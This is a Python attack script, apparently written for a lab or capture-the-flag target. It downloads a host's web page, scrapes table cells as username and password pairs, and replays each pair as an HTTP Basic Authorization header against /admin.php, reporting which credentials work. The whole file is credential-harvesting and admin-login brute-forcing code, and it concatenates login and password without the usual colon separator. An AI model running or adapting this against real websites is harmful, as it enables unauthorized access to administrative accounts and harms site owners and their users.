import socket
import urllib.request
import argparse
import http_methods_scanner
import base64

class StatColours:
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


def get_read_html(url):
    try:
        f = urllib.request.urlopen(url)
        html_body = f.read().decode()    
        print(f"{StatColours.OKGREEN}[+] ", url, \
            f"{StatColours.ENDC} body extracted successfully")
        return  html_body
    except Exception as e:
        print(f"{StatColours.FAIL}[-] {StatColours.ENDC}", url,  \
             " failed due to: ", e)

def write_html2file(fname, html_handle):
    with open(fname, "w+") as f:
        f.writelines(html_handle)

def credentials_parser(html_file):
    credentials={}
    login_open_tag = "<tr><td id=\"name\">"
    login_close_tag = "</td><td"
    pwd_tag = "<td id=\"department\">"
    pwd_close_tag = "</td></tr>"

    with open(html_file, "r") as f:
        all_lines = f.readlines()
        for line in all_lines:
            if login_open_tag in line:
                #find position of the opening tag
                logind_open = line.find(login_open_tag)
                #find position of the closing tag
                logind_close = line.find(login_close_tag)
                #find position of the payload after opening tag
                ind_login = logind_open + len(login_open_tag)
                #analog to login tag above
                pwd_open = line.find(pwd_tag)
                pwd_close = line.find(pwd_close_tag)
                ind_pwd = pwd_open + len(pwd_tag)
                #extract credentials between opening and closing tags
                credentials [line[ind_login:logind_close]] = \
                     line[ind_pwd:pwd_close]

    if credentials:
        print(f"{StatColours.OKGREEN}[+] ", \
            f"credentials extracted successfully {StatColours.ENDC}")
        print(credentials)

    return credentials

def main():

    parser = argparse.ArgumentParser()
    parser.add_argument('host', type=str)

    args = parser.parse_args()
    host = args.host
    url = "http://" + host

    html_file = "elearn.html"
    port = 80
    request_type = 'GET'
    path = '/admin.php'
    headers = {}    

    html_body = get_read_html(url)
    write_html2file(html_file, html_body)
    credentials = credentials_parser(html_file)

    for key in credentials:
        current_credential = (key + credentials[key]).encode('ascii')
        base64_cred = base64.b64encode(current_credential)
        headers ["Authorization"] = b"Basic " + base64_cred
        #feed credentials stream into automatic GET request
        res = http_methods_scanner.chk_ressource(host,port,\
            request_type,path, headers)
        if res == "success":
            print("Credentials: ", current_credential)

if __name__ == "__main__":
    main()